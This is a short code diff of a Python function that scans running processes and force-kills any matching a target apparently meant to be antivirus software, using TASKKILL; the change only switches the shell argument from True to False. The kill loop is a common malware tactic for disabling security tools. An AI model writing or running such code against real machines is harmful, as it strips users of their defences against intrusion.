@@ -250,6 +250,6 @@ def F2058():
 		for p in ps:
 			if p==av:
 				#killing off av variable
-				subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=True)
+				subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=False)
 
 F2058()
